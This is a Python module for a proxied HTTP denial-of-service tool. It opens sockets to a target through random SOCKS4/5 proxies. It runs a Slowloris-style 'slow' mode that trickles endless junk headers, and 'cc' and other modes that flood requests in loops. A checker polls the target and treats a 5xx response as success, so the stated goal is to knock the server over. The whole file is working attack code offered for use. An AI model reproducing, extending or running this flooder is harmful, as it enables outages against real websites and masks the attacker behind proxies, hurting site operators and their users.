import ssl
import socks
import socket
from requests import get
from urllib.parse import urlparse, ParseResult
from random import randint
from time import sleep
from multiprocessing import Manager

from .cc_utils import gen_header
from .socks_proxy_getter import get_random_proxy

manager = Manager()

i = manager.Value('d', 0)


def send_request(mode: str,
                 target: str,
                 stop: bool,
                 proxy: str or None = None):
    target_url = urlparse(target)
    while True:
        if not stop.value:
            try:
                print("Start new socket.")
                if not proxy:
                    proxy = get_random_proxy()
                with (_get_socket(target_url, proxy)) as s:
                    if mode == 'slow':
                        slow(s, target_url, stop)
                    else:
                        other_request(s, target_url, mode)
            except Exception as e:
                print(f"Socket stoped, e: {e}")
                pass
        else:
            sleep(10)
            print("Wait Start")


def other_request(s, target_url: ParseResult, mode):
    for _ in range(100):
        global i
        i.value += 1
        request = _mk_request(mode, target_url)
        sent = s.send(str.encode(request))
        if not sent:
            print("Socket Stop")
        print(f"Socket request send. [{i.value}]")


def slow(s, target_url: ParseResult, stop):
    request = _mk_request('slow', target_url)
    sent = s.send(str.encode(request))
    while not stop.value:
        global i
        i.value += 1
        sent = s.send(f'X-a: {randint(1, 5000)}\r\n'.encode("utf-8"))
        if not sent:
            print("Socket stoped.")
        print(f"Socket request send. [{i.value}]")


def check(target: str, stop):
    while not stop.value:
        try:
            sleep(10)
            print("Checking...")
            with (get(target)) as r:
                if r.status_code >= 500:
                    stop.value = True
                print(f"Check Status Code: {r.status_code}")
        except Exception as e:
            print(f"Check Failed, e: {e}")
            pass


def _mk_request(mode: int, target_url: ParseResult):
    if mode == 'cc':
        header = gen_header("get", target_url)
    else:
        header = gen_header(mode, target_url)
    return header


def _get_socket(target_url: ParseResult, proxy: str or None = None):
    host = target_url.hostname
    port = target_url.port
    if not port:
        if target_url.scheme == "https":
            port = 443
        else:
            port = 80
    s = socks.socksocket()
    if proxy:
        print(f"Use Proxy: {proxy}")
        proxy_url = urlparse(proxy)
        if proxy_url.scheme == 'socks5':
            socks_type = socks.SOCKS5
        else:
            socks_type = socks.SOCKS4
        s.set_proxy(socks_type, proxy_url.hostname, proxy_url.port)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if target_url.scheme == "https" or port == 443:
        ctx = ssl.SSLContext()
        s = ctx.wrap_socket(s, server_hostname=host)
    s.settimeout(15)
    s.connect((host, port))
    return s
